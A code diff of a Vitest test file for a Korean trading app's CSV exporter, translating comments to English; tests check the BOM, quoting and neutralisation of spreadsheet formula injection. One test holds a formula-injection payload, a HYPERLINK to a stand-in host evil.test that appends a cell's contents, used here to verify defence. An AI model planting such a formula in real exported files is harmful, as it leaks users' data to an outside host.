@@ -1,10 +1,10 @@
-// 매매기록 CSV 내보내기 (#181) — 순수 변환부.
+// Trade-record CSV export (#181) - the pure conversion.
 //
-// 엑셀·구글시트 양쪽에서 그대로 열리는 것이 목표다. 그래서 신경 쓸 것이 둘 있다.
+// The goal is a file that opens as is in both Excel and Google Sheets, which means two things to watch.
 //
-// 1) **UTF-8 BOM** — 없으면 엑셀이 한글을 깨뜨린다(구글시트는 괜찮다). 그래서 늘 붙인다.
-// 2) **수식 주입** — `=`·`+`·`-`·`@` 로 시작하는 셀을 엑셀·시트가 *수식으로 실행*한다.
-//    종목명·사유가 그대로 셀에 들어가므로, 열자마자 뭔가 실행되는 일이 없게 막는다.
+// 1) **A UTF-8 BOM** - without it Excel mangles Korean (Sheets is fine). So it is always added.
+// 2) **Formula injection** - Excel and Sheets *execute* a cell starting with `=`, `+`, `-` or `@`.
+//    Symbol names and reasons land in cells verbatim, so nothing may run the moment the file is opened.
 import { describe, it, expect } from 'vitest';
 import { CSV_BOM, csvCell, toCsv, type Column } from './export-csv';
 
@@ -60,7 +60,7 @@ describe('csvCell — 한 칸 만들기', () => {
     expect(csvCell(new Date('2026-08-18T01:23:45.000Z'))).toBe('2026-08-18 10:23:45');
   });
 
-  // 여기가 이 파일의 핵심이다.
+  // This is the heart of the file.
   describe('수식 주입 차단', () => {
     it.each(['=1+1', '+1', '-1', '@SUM(A1)'])('%s 는 수식으로 실행되지 않게 무력화한다', (v) => {
       const out = csvCell(v);
@@ -71,7 +71,7 @@ describe('csvCell — 한 칸 만들기', () => {
       const attack = '=HYPERLINK("http://evil.test?"&A1,"클릭")';
       const out = csvCell(attack);
       expect(out).toContain("'=HYPERLINK");
-      // 따옴표가 들어 있으니 감싸기도 함께 걸린다.
+      // It contains a quote, so it gets wrapped as well.
       expect(out.startsWith('"')).toBe(true);
     });
 
@@ -89,8 +89,8 @@ describe('csvCell — 한 칸 만들기', () => {
 
 describe('toCsv — 표 만들기', () => {
   it('BOM 으로 시작한다 — 엑셀 한글 깨짐 방지', () => {
-    // 코드포인트로 못박는다. CSV_BOM 이 빈 문자열이면 startsWith 는 늘 참이라 그냥 통과한다
-    // (실제로 그렇게 통과한 적이 있다 — 라우트 테스트가 잡았다).
+    // Pinned by code point. If CSV_BOM were an empty string, startsWith would always be true and this would just pass
+    // (which it once did - the route test caught it).
     expect(CSV_BOM).toBe('\ufeff');
     expect(CSV_BOM.charCodeAt(0)).toBe(0xfeff);
     expect(toCsv([row()], COLS).charCodeAt(0)).toBe(0xfeff);
@@ -122,7 +122,7 @@ describe('toCsv — 표 만들기', () => {
   it('셀 안의 줄바꿈이 행을 쪼개지 않는다', () => {
     const out = toCsv([row({ note: '첫 줄\n둘째 줄' })], COLS).replace(CSV_BOM, '');
     expect(out).toContain('"첫 줄\n둘째 줄"');
-    // 따옴표 밖의 CRLF 는 머리글 뒤와 행 끝, 둘뿐이다.
+    // Outside quotes there are only two CRLFs: after the header and at the end of each row.
     expect(out.split('\r\n').filter(Boolean)).toHaveLength(2);
   });
 });
